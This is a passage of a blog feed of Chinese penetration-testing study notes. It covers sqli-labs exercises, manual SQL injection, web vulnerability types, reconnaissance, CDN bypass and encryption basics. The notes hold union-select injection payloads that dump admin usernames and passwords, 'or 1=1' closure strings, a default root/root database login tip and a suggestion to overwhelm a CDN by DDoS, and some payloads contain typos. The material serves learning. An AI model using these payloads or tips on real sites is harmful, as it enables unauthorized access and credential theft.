class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/01/30/Less1-Less4/image-20220201022028864.png" alt="image-20220201022028864"></p><h2 id="0x03-3"><a href="#0x03-3" class="headerlink" title="0x03"></a>0x03</h2><p>与Less-3一样，可成功注入的有：</p><pre class="line-numbers language-none"><code class="language-none">“) or ”1”&#x3D;(“1“) or 1&#x3D;1 --+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="0x04-2"><a href="#0x04-2" class="headerlink" title="0x04"></a>0x04</h2><p>其余的 payload 与 less1 中一致，只需要将 less-1 中的 ‘ 更换为 “)。</p>]]></content>
      
      
      <categories>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>简要SQL注入</title>
      <link href="/2022/01/30/%E7%AE%80%E8%A6%81SQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2022/01/30/%E7%AE%80%E8%A6%81SQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>[TOC]</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>SQL 注入漏洞是重点部分，其中 SQL 注入 又非常复杂，区分各种数据库类型，提交方法，数据类型等注入等，此类漏洞是 WEB 安全中严重的安全漏洞，学习如何利用，挖掘，修复。</p><h2 id="SQL注入图解"><a href="#SQL注入图解" class="headerlink" title="SQL注入图解"></a>SQL注入图解</h2><p><img src="/2022/01/30/%E7%AE%80%E8%A6%81SQL%E6%B3%A8%E5%85%A5/image-20220130212558105.png" alt="image-20220130212558105"></p><h2 id="手工注入原理"><a href="#手工注入原理" class="headerlink" title="手工注入原理"></a>手工注入原理</h2><p>手工注入：<br>构造不同的sql语句，用户输入的数据拼接到原本的语句之后带入数据库执行。</p><p>数据库各种各样，但是：都用sql语句调用<br>  （不同的数据库，同样的操作，语句会有些许些许不同）<br><strong>这些不同可以让我们判断目标网站是什么类型的数据库。</strong></p><p><strong>一、判断注入点</strong><br>id&#x3D;1’在1后面加上单引号，页面出错</p><p>id&#x3D;1 and 1&#x3D;1 正常 id&#x3D;1 and 1&#x3D;2 错误</p><p>使用–注释时，需要使用空格，才能形成有效的sql语句，<br>而#后面可以有空格，也可以没有，sql就是这么规定的，记住就行了。</p><p>不加空格，–直接和系统自动生成的单引号连接在了一起，</p><p>会被认为是一个关键词，无法注释掉系统自动生成的单引号。</p><p><strong>二、判断字段数</strong><br>order by：ORDER BY语句用于根据指定的列对结果集进行排序</p><p><strong>三、判断回显点</strong><br>union联合 合并：将多条查询语句的结果合并成一个结果</p><p>group_concat()函数：查出库中所有的表</p><p><strong>四、查询相关内容</strong><br>猜询数据库版本<br>and 1&#x3D;2 union select 1,version()</p><p>猜询数据库</p><pre class="line-numbers language-none"><code class="language-none">and 1&#x3D;2 union select 1,schema_name from information_schema.tables limit 0，1（...）<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">and 1&#x3D;2 union select 1,(select group_concat(schema_name) from           information_schema.tables)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>schema_name字段中存放着所有数据库名</strong><br><strong>table_schema字段中存储着对应的数据库</strong></p><pre class="line-numbers language-none"><code class="language-none">select schema_name from information_schema.schemata<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>select database();查看当前所在的库</p><p>猜询表名</p><pre class="line-numbers language-none"><code class="language-none">and 1&#x3D;2 union select 1,table_name  from  information_schema.tables where table_schema&#x3D;database() limit 1,1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">and 1&#x3D;2 union select 1,(select group_cancat(column_name) from information_schema.tables where table_schema&#x3D;database() and table_name&#x3D;&#39;admin&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>【table_name字段中存储着对应的表名】<br>【column_name字段中存储着对应的值】</p><p>查询字段内容</p><pre class="line-numbers language-none"><code class="language-none">and 1&#x3D;2 union select 1,cancat(username,&#39;,&#39;,password) from admin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>修改库名</p><pre class="line-numbers language-none"><code class="language-none">rename database 库名  to  新库名；<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>修改列名</p><pre class="line-numbers language-none"><code class="language-none">alter table 库名 change column 旧列名 新列名 DATATIME（加类型）<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>修改列的类型或约束</p><pre class="line-numbers language-none"><code class="language-none">alter table 库名 modify column 旧列名 TIMESTAMP；（修改类型）<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h2><ol><li>version()——MySQL 版本 </li><li>user()——数据库用户名 </li><li>database()——数据库名 </li><li>@@datadir——数据库路径 </li><li>@@version_compile_os——操作系统版本</li><li>concat(str1,str2,…)——没有分隔符地连接字符串</li><li>concat_ws(separator,str1,str2,…)——含有分隔符地连接字符串</li><li>group_concat(str1,str2,…)——连接一个组的所有字符串，并以逗号分隔每一条数据</li></ol><h2 id="一般注入的语句"><a href="#一般注入的语句" class="headerlink" title="一般注入的语句"></a>一般注入的语句</h2><p>or 1&#x3D;1–+ </p><p>‘or 1&#x3D;1–+ </p><p>“or 1&#x3D;1–+ </p><p>)or 1&#x3D;1–+ </p><p>‘)or 1&#x3D;1–+ </p><p>“) or 1&#x3D;1–+ </p><p>“))or 1&#x3D;1–</p><p>其源码一般为：</p><p>$id&#x3D;$_GET[‘id’]; </p><p>$sql&#x3D;”SELECT * FROM users WHERE id&#x3D;’$id’ LIMIT 0,1”</p><p>此处考虑两个点，一个是闭合前面你的 ‘ 另一个是处理后面的 ‘ ，一般采用两种思 路，闭合后面的引号或者注释掉，注释掉采用–+ 或者 #（%23）</p><p><strong>逻辑运算的举例</strong>：</p><p>①Select * from users where id&#x3D;1 and 1&#x3D;1; </p><p>②Select * from users where id&#x3D;1 &amp;&amp; 1&#x3D;1; </p><p>③Select * from users where id&#x3D;1 &amp; 1&#x3D;1; </p><p>上述三者有什么区别？</p><p>①和②是一样的，表达的意思是 id&#x3D;1 条件和 1&#x3D;1 条件进行与运算。③的意思是 id&#x3D;1 条件与 1 进行&amp;位操作，id&#x3D;1 被当作 true，与 1 进行 &amp; 运算 结果还是 1， 再进行&#x3D;操作，1&#x3D;1,还是 1（ps：&amp;的优先级大于&#x3D;）</p><p><strong>完整的注入流程：</strong></p><p>猜数据库 </p><pre class="line-numbers language-none"><code class="language-none">select schema_name from information_schema.schemata <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>猜某库的数据表 </p><pre class="line-numbers language-none"><code class="language-none">select table_name from information_schema.tables where table_schema&#x3D;’xxxxx’ <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>猜某表的所有列 </p><pre class="line-numbers language-none"><code class="language-none">Select column_name from information_schema.columns where table_name&#x3D;’xxxxx’ <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEB漏洞知识点</title>
      <link href="/2022/01/30/WEB%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
      <url>/2022/01/30/WEB%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>[TOC]</p><p>##前言</p><p>WEB层面涉及的漏洞关系到渗透过程中的方方面面，漏洞的危害等级以及影响的范围等，要明白各个漏洞的形成原理，并且要明白如何去发现，如何去利用。</p><p><img src="/2022/01/30/WEB%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E7%82%B9/image-20220130153259561.png" alt="image-20220130153259561"></p><h2 id="常见漏洞原理"><a href="#常见漏洞原理" class="headerlink" title="常见漏洞原理"></a>常见漏洞原理</h2><ol><li><p><strong>SQL注入</strong>：简称注入攻击、SQL注入，被广泛用于非法获取网站控制权，是发生在应用程序的数据库层上的安全漏洞。在设计程序，忽略了对输入字符串中夹带的SQL指令的检查，被数据库误认为是正常的SQL指令而运行，从而使数据库受到攻击，可能导致数据被窃取、更改、删除，以及进一步导致网站被嵌入恶意代码、被植入后门程序等危害。<br>通常情况下，SQL注入的位置包括：<br>（1）表单提交，主要是POST请求，也包括GET请求；<br>（2）URL参数提交，主要为GET请求参数；<br>（3）Cookie参数提交；<br>（4）HTTP请求头部的一些可修改的值，比如Referer、User_Agent等；<br>（5）一些边缘的输入点，比如.mp3文件的一些文件信息等。</p></li><li><p><strong>文件上传</strong>：文件上传漏洞通常由于网页代码中的文件上传路径变量过滤不严造成的，如果文件上传功能实现代码没有严格限制用户上传的文件后缀以及文件类型，攻击者可通过 Web 访问的目录上传任意文件，包括网站后门文件（webshell），进而远程控制网站服务器。<br>因此，在开发网站及应用程序过程中，需严格限制和校验上传的文件，禁止上传恶意代码的文件。同时限制相关目录的执行权限，防范webshell攻击。</p></li><li><p><strong>XSS跨站</strong>：跨站脚本攻击（Cross-site scripting，通常简称为XSS）发生在客户端，可被用于进行窃取隐私、钓鱼欺骗、窃取密码、传播恶意代码等攻击。<br>XSS攻击使用到的技术主要为HTML和Javascript，也包括VBScript和ActionScript等。XSS攻击对WEB服务器虽无直接危害，但是它借助网站进行传播，使网站的使用用户受到攻击，导致网站用户帐号被窃取，从而对网站也产生了较严重的危害。<br>XSS类型包括：<br>（1）非持久型跨站：即反射型跨站脚本漏洞，是目前最普遍的跨站类型。跨站代码一般存在于链接中，请求这样的链接时，跨站代码经过服务端反射回来，这类跨站的代码不存储到服务端（比如数据库中）。上面章节所举的例子就是这类情况。<br>（2）持久型跨站：这是危害最直接的跨站类型，跨站代码存储于服务端（比如数据库中）。常见情况是某用户在论坛发贴，如果论坛没有过滤用户输入的Javascript代码数据，就会导致其他浏览此贴的用户的浏览器会执行发贴人所嵌入的Javascript代码。<br>（3）DOM跨站（DOM XSS）：是一种发生在客户端DOM（Document Object Model文档对象模型）中的跨站漏洞，很大原因是因为客户端脚本处理逻辑导致的安全问题。 </p></li><li><p><strong>文件包含</strong>：由攻击者向Web服务器发送请求时，在URL添加非法参数，Web服务器端程序变量过滤不严，把非法的文件名作为参数处理。这些非法的文件名可以是服务器本地的某个文件，也可以是远端的某个恶意文件。由于这种漏洞是由PHP变量过滤不严导致的，所以<strong>只有基于PHP开发的Web应用程序才有可能存在文件包含漏洞</strong>。</p></li><li><p><strong>CSRF</strong>：跨站请求伪造，它利用受害者尚未失效的身份认证信息（cookie，会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。</p></li><li><p><strong>SSRF</strong>：服务端请求伪造，由攻击者构造形成由服务端发起请求的一个安全漏洞。 一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统） SSRF漏洞形成的原因大多是因为服务端提供了从其他服务器应用获取数据的功能且没有对目标地址作过滤和限制。</p></li><li><p><strong>目录遍历</strong>： 目录遍历漏洞是攻击者向Web服务器发送请求，通过在URL中或在有特殊意义的目录中附加“..&#x2F;”、或者附加“..&#x2F;”的一些变形（如“..\”或“..&#x2F;&#x2F;”甚至其编码），导致攻击者能够访问未授权的目录，以及在Web服务器的根目录以外执行命令。</p></li><li><p><strong>命令执行</strong>：命令执行漏洞是通过URL发起请求，在Web服务器端执行未授权的命令，获取系统信息，篡改系统配置，控制整个系统，使系统瘫痪等。</p><p>命令执行漏洞主要有两种情况：</p><p>   –通过目录遍历漏洞，访问系统文件夹，执行指定的系统命令；</p><p>  –攻击者提交特殊的字符或者命令，Web程序没有进行检测或者绕过Web应用程序过滤，把用户提交的请求作为指令进行解析，导致执行任意命令。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>架构，搭建，WAF等</title>
      <link href="/2022/01/28/%E6%9E%B6%E6%9E%84%EF%BC%8C%E6%90%AD%E5%BB%BA%EF%BC%8CWAF%E7%AD%89/"/>
      <url>/2022/01/28/%E6%9E%B6%E6%9E%84%EF%BC%8C%E6%90%AD%E5%BB%BA%EF%BC%8CWAF%E7%AD%89/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>[TOC]</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在安全测试中，信息收集是非常重要的一个环节，此环节的信息将影响 到后续的成功几率，掌握信息的多少将决定发现漏洞机会大小，换言之决定着是否能完成目标的测试任务。渗透测试的思路 就是从信息收集这里开始。</p><p><img src="/2022/01/28/%E6%9E%B6%E6%9E%84%EF%BC%8C%E6%90%AD%E5%BB%BA%EF%BC%8CWAF%E7%AD%89/image-20220128201243759.png" alt="image-20220128201243759"></p><p>所谓信息搜集，其实就是为了扩大攻击面，信息搜集的越多，攻击的范围越大。</p><h2 id="站点搭建分析"><a href="#站点搭建分析" class="headerlink" title="站点搭建分析"></a>站点搭建分析</h2><p>1.**搭建习惯-目录型站点 **：主站是一套程序，加一个目录打开后又是一套程序；两套程序会有两个漏洞形式（扫描目录或其他方法）；</p><p>2.<strong>搭建习惯-端口类站点</strong> ：网站管理员通过端口名使网站应用分开，例如：主站装在80端口，或其他端口配置其他服务，但是都在同一台服务器，若其中端口出现了问题，例如80端口出现漏洞，会影响其他端口（扫描端口或其他方法）；</p><p>3.<strong>搭建习惯-子域名站点</strong> ：子站和主站不在一台服务器上，如果在一个网段的话，会出现内网安全隐患；</p><p>如果不同网段的话，搜集子站其他关于主站的信息再进行主站测试；</p><p>4.<strong>搭建习惯-类似域名站点</strong> ：域名的后缀不同或者域名的名字有所修改等，可以自己写个工具跑一下类似域名；可以在搜索引擎搜索 <strong>域名+php</strong> 或直接搜索域名找<strong>类似站点</strong>搜集更多信息。</p><p>5.<strong>搭建习惯-旁注,C 段站点</strong> ：</p><p><strong>旁注</strong>：同服务器，不同站点；例如：有 a站，b站等网站（多个站点服务器），我的目标的是b站，我通过查询又知道了有a站和其他站的存在，b站由于技术有限找不到漏洞；再找a站或其他站的权限问题再去获取到b站的权限；旁注查询：<a href="https://www.webscan.cc/">https://www.webscan.cc/</a></p><p><strong>C段</strong>：同网段，不同服务器，不同站点；例如：有a站，b站，c站和d站；目标是a站，查询网段信息，比如查询到了c站的网段，这个网段下有个多个网站，拿到其中一个站的权限，在通过提权获取到这个服务器的权限，由于目标主机处于同一内网下，再实施内网安全的测试方法获取到指定网站的服务器权限；</p><p>6.<strong>搭建习惯-搭建软件特征站点</strong> ：例如：phpstudy除新版本外采用root&#x2F;root作为数据库的默认密码；还有phpmyadmin文件夹，可以进入phpmyadmin文件夹使用默认数据库密码进入数据库</p><p>##WAF 防护分析</p><p>1.什么是WAF应用：</p><p>Web应用防护系统（也称为：<a href="https://baike.baidu.com/item/%E7%BD%91%E7%AB%99/155722">网站</a>应用级入侵防御系统。英文：Web Application Firewall，简称： WAF）。利用<a href="https://baike.baidu.com/item/%E5%9B%BD%E9%99%85/766689">国际</a>上公认的一种说法：Web应用<a href="https://baike.baidu.com/item/%E9%98%B2%E7%81%AB%E5%A2%99">防火墙</a>是通过执行一系列针对HTTP&#x2F;HTTPS的<a href="https://baike.baidu.com/item/%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5/2890163">安全策略</a>来专门为<a href="https://baike.baidu.com/item/Web/150564">Web</a>应用提供保护的一款产品。</p><p>2.如何快速识别WAF：wafw00f或者手工识别；部分网站数据包有此字段：X-Powered-By: WAF</p><p>3.识别WAF对于安全测试的意义：了解是什么WAF，进行下一步。</p><h2 id="APP及其他资产等"><a href="#APP及其他资产等" class="headerlink" title="APP及其他资产等"></a>APP及其他资产等</h2><p>在安全测试中，若 WEB 无法取得进展或无 WEB 的情况下，我们需要 借助 APP 或其他资产在进行信息收集，从而开展后续渗透。</p><h3 id="APP-提取及抓包及后续配合"><a href="#APP-提取及抓包及后续配合" class="headerlink" title="APP 提取及抓包及后续配合"></a>APP 提取及抓包及后续配合</h3><p>APP如果涉及WEB，按照WEB思路继续渗透；</p><p>APP如果不涉及WEB：</p><p><strong>各种端口一顿乱扫</strong>-思路 </p><p><strong>各种接口一顿乱扫</strong>-思路 </p><p><strong>接口部分一顿测试</strong>-思路</p><p>利用黑暗引擎搜索–乱扫：</p><p><a href="https://fofa.so/">https://fofa.so/</a></p><p><a href="https://www.shodan.io/">https://www.shodan.io/</a></p><p><a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a></p><p>乱扫的目的是为了搜集更广泛的信息，扩大攻击面，为后续的渗透奠定坚实的基础。</p><h2 id="资产监控拓展"><a href="#资产监控拓展" class="headerlink" title="资产监控拓展"></a>资产监控拓展</h2><p>域名搜集途径：</p><p><img src="/2022/01/28/%E6%9E%B6%E6%9E%84%EF%BC%8C%E6%90%AD%E5%BB%BA%EF%BC%8CWAF%E7%AD%89/image-20220129220745739.png" alt="image-20220129220745739"></p><p>##各种子域名查询</p><p>1.DNS,备案,证书：利用站长工具进行搜集</p><p>2.全球节点请求 cdn</p><p>3.枚举爆破或解析子域名对应</p><p>4.便于发现管理员相关的注册信息</p><p>##Github 监控</p><p>1.便于收集整理最新 exp 或 poc</p><p>2.便于发现相关测试目标的资产</p><p>（需要导入一个python脚本进行微信推送）</p><h2 id="涉及网站"><a href="#涉及网站" class="headerlink" title="涉及网站"></a>涉及网站</h2><p>全球CDN服务查询：<a href="http://tools.ipip.net/cdn.php">http://tools.ipip.net/cdn.php</a></p><p>查询DNS解析记录：<a href="https://securitytrails.com/">https://securitytrails.com/</a></p><p>​                                   <a href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a></p><p>(更多查看思维导图)</p>]]></content>
      
      
      <categories>
          
          <category> 信息搜集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息搜集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CDN绕过技术</title>
      <link href="/2022/01/28/CDN%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF/"/>
      <url>/2022/01/28/CDN%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>[TOC]</p><h2 id="CDN绕过"><a href="#CDN绕过" class="headerlink" title="CDN绕过"></a>CDN绕过</h2><p>CDN的全称是Content Delivery Network，即<a href="https://baike.baidu.com/item/%E5%86%85%E5%AE%B9%E5%88%86%E5%8F%91%E7%BD%91%E7%BB%9C/4034265">内容分发网络</a>。CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，<strong>使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。</strong>但在安全测试过程中，若目标存在CDN服务，将会影响到后续的安全测试过程。</p><p><img src="/2022/01/28/CDN%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF/image-20220128105333115.png" alt="image-20220128105333115"></p><p>若对网站做安全测试的时候，对网站进行扫描的话，不能对CDN节点进行扫描；因为CDN节点主要目的为了用户提供访问速度，并且CDN节点只是一个缓存，缓存和真实的地方有很大区别，缓存具有时效性，不能与真实的网站最新内容相同步；所以对CDN进行网站扫描或漏洞利用或后门控制的话，只是一个虚拟的缓存网站，不是真实的网站；这就是为什么要进行CDN绕过。</p><h2 id="如何判断目标存在CDN服务"><a href="#如何判断目标存在CDN服务" class="headerlink" title="如何判断目标存在CDN服务"></a>如何判断目标存在CDN服务</h2><p>利用多节点技术进行请求返回判断</p><p>当去Ping优酷网站时可以看到，出现多个不同的IP地址，这表明存在CDN节点；若出现都是相同IP表明不存在CDN节点。</p><p><img src="/2022/01/28/CDN%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF/image-20220128112456727.png" alt="image-20220128112456727"></p><p><img src="/2022/01/28/CDN%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF/image-20220128112437182.png" alt="image-20220128112437182"></p><h2 id="常见的-CDN-绕过技术"><a href="#常见的-CDN-绕过技术" class="headerlink" title="常见的 CDN 绕过技术"></a>常见的 CDN 绕过技术</h2><p>1.子域名查询 ：</p><p>CDN不便宜，导致很多站长可能只会对主站或者流量大的子站点做了 CDN，而很多子站点又跟主站在同一台服务器或者同一个C段内，此时就可以通过查询子域名对应的 IP 来辅助查找网站的真实IP。</p><p>2.邮件服务查询 ：根据对方邮件服务器给自己发送的邮件来判断对方邮件服务器的地址，这个地址可能就是网站服务器地址，或者反推主站服务器IP。邮件源码测试对比第三方查询（地区分析）</p><p>3.国外地址请求：由于国外一般不设置CDN，所以使用国外地址请求国内服务器大概率会获取到真实IP。</p><p>4.遗留文件，扫描全网：遗留文件类似于phpinfo.php文件（php配置文件）可能会有真实IP；扫描全网就是对全世界的网络进行响应，通过返回的IP地址进行搜集整理，再从这些IP中分析那个是真实IP；<strong>这是由于不是所有地区都有CDN，可能分析出的IP就是真实IP</strong></p><p>5.黑暗引擎搜索特定文件：傻蛋，钟馗之眼，fofa</p><p>6.dns 历史记录，以量打量：查询DNS记录获取真实IP；以量打量，通过DDOS攻击使CDN上的流量耗尽，再访问就会访问到真实网站IP。<strong>这是由于CDN也是使用流量，其流量也会使用殆尽</strong></p><h2 id="利用子域名请求获取真实-IP"><a href="#利用子域名请求获取真实-IP" class="headerlink" title="利用子域名请求获取真实 IP"></a>利用子域名请求获取真实 IP</h2><p>子域名小技巧：</p><p>网站在设置的时候主站一般会设置成：</p><p>*域名.com和www.域名.com</p><p>这时当你在浏览器访问的时候不管你加不加www.都会解析出网站；</p><p>而网站使用CDN节点时，若CDN节点只针对www.域名.com进行了设置，就会有多个IP，此时若查询域名.com就会查询到主站IP。(<strong>主要由于网站解析设置和在浏览器解析时会出现</strong>)</p><p>###利用国外地址请求获取真实 IP</p><p>使用该网站：<a href="https://asm.ca.com/en/ping.php">https://asm.ca.com/en/ping.php</a></p><h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><p>shodan：<a href="https://www.shodan.io/">https://www.shodan.io/</a></p><p>超级Ping：<a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a></p><p>第三方查询：<a href="https://www.get-site-ip.com/">https://www.get-site-ip.com/</a></p><p>​                       <a href="https://asm.ca.com/en/ping.php">https://asm.ca.com/en/ping.php</a></p><p>​                       <a href="https://wepcc.com/">https://wepcc.com/</a></p><p>全球CDN服务查询：<a href="http://tools.ipip.net/cdn.php">http://tools.ipip.net/cdn.php</a></p><p>查询DNS解析记录：<a href="https://securitytrails.com/">https://securitytrails.com/</a></p><p>​                                   <a href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a></p>]]></content>
      
      
      <categories>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息搜集 </tag>
            
            <tag> 基础知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>加密编码算法</title>
      <link href="/2022/01/27/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95/"/>
      <url>/2022/01/27/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>[TOC]</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在渗透测试中，常见的密码等敏感信息会采用加密处理，其中作为安全测试人员必须要了解常见的加密方式，才能为后续的安全测试做好准备。</p><p>###常见加密编码等算法</p><p><strong>MD5</strong>，SHA，ASC，进制，时间戳，URL，BASE64，Unescape，AES，DES 等</p><p><img src="/2022/01/27/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95/image-20220127213911368.png" alt="image-20220127213911368"></p><p>MD5解密不是从密文直接解密到明文，平台通过提交的密文与平台原来已经跑出来的密文进行对比，如果相匹配，则将已经用跑出来的密文对应的明文呈现给用户。<strong>（不是逆向解密）</strong></p><p>Unescape编码判断：%u+4个数字</p><p><img src="/2022/01/27/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95/image-20220127220601104.png" alt="image-20220127220601104"></p><p>AES加密方式，输出是使用Base64格式&#x2F;Hex格式；则，若遇到Base64格式&#x2F;Hex格式解密得到的是乱码，应该往AES加密方式去想。</p><p>AES解密的话，必须要知道<strong>密码</strong>和<strong>偏移量</strong>。</p><p><img src="/2022/01/27/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95/image-20220127221301364.png" alt="image-20220127221301364"></p><h3 id="常见加密形式算法"><a href="#常见加密形式算法" class="headerlink" title="常见加密形式算法"></a>常见加密形式算法</h3><p>直接加密，带 salt，带密码，带偏移，带位数，带模式，带干扰，自定义组合等</p><h3 id="常见解密方式（针对）"><a href="#常见解密方式（针对）" class="headerlink" title="常见解密方式（针对）"></a>常见解密方式（针对）</h3><p>枚举，自定义逆向算法，可逆向</p><h3 id="常规加密算法的特性"><a href="#常规加密算法的特性" class="headerlink" title="常规加密算法的特性"></a>常规加密算法的特性</h3><p>长度位数，字符规律，代码分析，搜索获取等</p><p>###某 CMS 密码加密解密</p><p>MD5+salt格式：md5(md5($pass)$salt);</p><p>这样的加密方式：</p><p>是先对密码进行了md5加密：md5($pass)，而md5长度16位和32位都有可能并且又加了salt，可能性很多，基本无解；</p><p>再进行了md5加密，相当于两次md5加密。</p><p>（如果拿不到salt或其他的信息，无解）</p><p>在安全测试过程中，遇到解密的时候，一定要清楚其是什么加密算法，什么加密方法，再想其解密方法。</p><h3 id="某实际应用-URL-地址参数加密"><a href="#某实际应用-URL-地址参数加密" class="headerlink" title="某实际应用 URL 地址参数加密"></a>某实际应用 URL 地址参数加密</h3><p>搜索特定关键字加密字符串</p><p>例如：国外的网站，SQL注入时候涉及加解密问题，如果直接使用工具去注入，工具不懂加解密，肯定会注入有问题。（谷歌连接国外的网站超时，图没截到，文字描述了）</p><p><strong>知识点的扩展程度是测试深度的前提。</strong></p><h2 id="其他资源"><a href="#其他资源" class="headerlink" title="其他资源"></a>其他资源</h2><p>CMD5网站地址：<a href="https://www.cmd5.com/">https://www.cmd5.com/</a></p><p>在线加解密工具：<a href="http://tool.chacuo.net/cryptaes">http://tool.chacuo.net/cryptaes</a></p>]]></content>
      
      
      <categories>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>系统及数据库</title>
      <link href="/2022/01/26/%E7%B3%BB%E7%BB%9F%E5%8F%8A%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
      <url>/2022/01/26/%E7%B3%BB%E7%BB%9F%E5%8F%8A%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>[TOC]</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>除去搭建平台中间件，网站源码外，容易受到攻击的还有操作系统，数据库等，第三方软件平台等，其中此类攻击也能直接影响到WEB或 服务器的安全，导致网站或服务器权限的获取。</p><p><img src="/2022/01/26/%E7%B3%BB%E7%BB%9F%E5%8F%8A%E6%95%B0%E6%8D%AE%E5%BA%93/image-20220127235003546.png" alt="image-20220127235003546"></p><h3 id="操作系统层面"><a href="#操作系统层面" class="headerlink" title="操作系统层面"></a>操作系统层面</h3><p><strong>识别操作系统常见方法：</strong></p><p>如过对方有网站，可以通过网站识别；如果没网站，就通过一些工具的扫描识别；</p><p>从网站上判断：window系统一般情况不区分大小写；Linux系统区别大小写。</p><p>通过TTL值判断：默认系统的TTL（不是很准确）</p><p>  1、WINDOWS NT&#x2F;2000  TTL：128</p><p>  2、WINDOWS 95&#x2F;98   TTL：32</p><p>  3、UNIX        TTL：255</p><p>  4、LINUX       TTL：64</p><p>  5、WIN7      